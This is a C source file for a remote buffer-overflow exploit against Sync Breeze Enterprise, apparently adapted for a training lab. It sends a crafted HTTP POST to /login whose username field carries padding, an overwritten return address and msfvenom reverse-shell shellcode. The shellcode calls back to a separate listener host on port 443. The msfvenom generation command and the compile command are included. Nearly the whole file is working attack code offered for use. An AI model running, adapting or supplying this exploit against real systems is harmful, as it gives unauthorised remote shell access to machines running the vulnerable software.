/*
Modified exploit

Sync Breeze Enterprise BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512

#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

DWORD SendRequest(char *request, int request_size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    printf("\n[>] Initialising Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("[>] Initialised.\n");
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] Could not create socket : %d", WSAGetLastError());
    }

    // Changed Port settings
    printf("[>] Socket created.\n");
    server.sin_addr.s_addr = inet_addr("192.168.193.10");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("[!] Connect error");
        return 1;
    }
    puts("[>] Connected");

    if (send(s, request, request_size, 0) < 0)
    {
        puts("[!] Send failed");
        return 1;
    }
    puts("\n[>] Request sent\n");
    closesocket(s);
    return 0;
}

void EvilRequest() {
    
    char request_one[] = "POST /login HTTP/1.1\r\n"
                        "Host: 172.16.116.222\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.5\r\n"
                        "Referer: http://172.16.116.222/login\r\n"
                        "Connection: close\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: ";
    char request_two[] = "\r\n\r\nusername=";
    
    int initial_buffer_size = 781;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    unsigned char retn[] = "\x83\x0c\x09\x10"; // Custom return address

    // msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.193 LPORT=443 EXITFUNC=thread -f c 
    // –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
    unsigned char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
    "\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
    "\xd2\xb5\xb0\xe7\x83\xee\xfc\xe2\xf4\x2e\x5d\x32\xe7\xd2\xb5"
    "\xd0\x6e\x37\x84\x70\x83\x59\xe5\x80\x6c\x80\xb9\x3b\xb5\xc6"
    "\x3e\xc2\xcf\xdd\x02\xfa\xc1\xe3\x4a\x1c\xdb\xb3\xc9\xb2\xcb"
    "\xf2\x74\x7f\xea\xd3\x72\x52\x15\x80\xe2\x3b\xb5\xc2\x3e\xfa"
    "\xdb\x59\xf9\xa1\x9f\x31\xfd\xb1\x36\x83\x3e\xe9\xc7\xd3\x66"
    "\x3b\xae\xca\x56\x8a\xae\x59\x81\x3b\xe6\x04\x84\x4f\x4b\x13"
    "\x7a\xbd\xe6\x15\x8d\x50\x92\x24\xb6\xcd\x1f\xe9\xc8\x94\x92"
    "\x36\xed\x3b\xbf\xf6\xb4\x63\x81\x59\xb9\xfb\x6c\x8a\xa9\xb1"
    "\x34\x59\xb1\x3b\xe6\x02\x3c\xf4\xc3\xf6\xee\xeb\x86\x8b\xef"
    "\xe1\x18\x32\xea\xef\xbd\x59\xa7\x5b\x6a\x8f\xdd\x83\xd5\xd2"
    "\xb5\xd8\x90\xa1\x87\xef\xb3\xba\xf9\xc7\xc1\xd5\x4a\x65\x5f"
    "\x42\xb4\xb0\xe7\xfb\x71\xe4\xb7\xba\x9c\x30\x8c\xd2\x4a\x65"
    "\xb7\x82\xe5\xe0\xa7\x82\xf5\xe0\x8f\x38\xba\x6f\x07\x2d\x60"
    "\x27\x8d\xd7\xdd\x70\x4f\xa5\x74\xd8\xe5\xd2\xb4\x0b\x6e\x34"
    "\xdf\xa0\xb1\x85\xdd\x29\x42\xa6\xd4\x4f\x32\x57\x75\xc4\xeb"
    "\x2d\xfb\xb8\x92\x3e\xdd\x40\x52\x70\xe3\x4f\x32\xba\xd6\xdd"
    "\x83\xd2\x3c\x53\xb0\x85\xe2\x81\x11\xb8\xa7\xe9\xb1\x30\x48"
    "\xd6\x20\x96\x91\x8c\xe6\xd3\x38\xf4\xc3\xc2\x73\xb0\xa3\x86"
    "\xe5\xe6\xb1\x84\xf3\xe6\xa9\x84\xe3\xe3\xb1\xba\xcc\x7c\xd8"
    "\x54\x4a\x65\x6e\x32\xfb\xe6\xa1\x2d\x85\xd8\xef\x55\xa8\xd0"
    "\x18\x07\x0e\x50\xfa\xf8\xbf\xd8\x41\x47\x08\x2d\x18\x07\x89"
    "\xb6\x9b\xd8\x35\x4b\x07\xa7\xb0\x0b\xa0\xc1\xc7\xdf\x8d\xd2"
    "\xe6\x4f\x32";

    char request_three[] = "&password=A";

    int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(request_three);
    char *content_length_string = malloc(15);
    sprintf(content_length_string, "%d", content_length);
    int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) + strlen(request_three);

    char *buffer = malloc(buffer_length);
    memset(buffer, 0x00, buffer_length);
    strcpy(buffer, request_one);
    strcat(buffer, content_length_string);
    strcat(buffer, request_two);
    strcat(buffer, padding);
    strcat(buffer, retn);
    strcat(buffer, shellcode);
    strcat(buffer, request_three);

    SendRequest(buffer, strlen(buffer));
}

int main() {

    EvilRequest();
    return 0;
}

// Compile with i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32